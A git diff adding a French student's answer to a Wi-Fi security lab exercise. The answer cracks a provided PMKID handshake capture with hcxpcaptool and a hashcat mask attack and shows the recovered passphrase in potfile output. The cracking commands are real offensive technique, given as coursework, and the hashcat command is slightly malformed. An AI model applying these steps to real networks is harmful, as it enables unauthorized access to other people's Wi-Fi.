@@ -122,6 +122,40 @@ Script: [files/pmkid_attack_automated.py](files/pmkid_attack_automated.py)
 
 A manière de comparaison, réaliser l'attaque sur le [fichier de capture](files/PMKID_handshake.pcap) utilisant la méthode décrite [ici](https://hashcat.net/forum/thread-7717.html).
 
+Réponse:
+
+Commandes:
+
+La commande suivante permet de convertir la capture en un fichier utilisable par
+hashcat : 
+
+```
+hcxpcaptool -z outhcx PMKID_handshake.pcap
+```
+
+Résultat:
+
+![Résultat](figures/SWI_WPA_3.3_1_hcxp.png)
+
+On peut ensuite cracker le mot de passe avec hashcat :
+
+Note: connaissant déjà le mot de passe, nous avons utilisé une attaque par mask
+avec 5 caractères en minuscule et 3 digits.
+
+```
+hashcat m 16800 outhcx -a 3 -w 3 '?l?l?l?l?l?d?d?d'
+```
+
+![Résultat](figures/SWI_WPA_3.3_2_hashcat.png)
+
+Hashcat trouve le mot de passe, qu'il stock dans le fichier hashcat.potfile :
+
+![Résultat hashcat](files/hashcat.potfile)
+
+```
+2882661babd570c1d8140763ac9df8e60040893519b4077dff332ee264d4cad5*53756e726973655f322e3447487a5f444434423930:admin123
+2882661babd570c1d8140763ac9df8e60040893519b4077dff332ee264d4cad5*53756e726973655f322e3447487a5f444434423930:admin123
+```
 
 ### 4. Scairodump (Challenge optionnel pour un bonus)
 
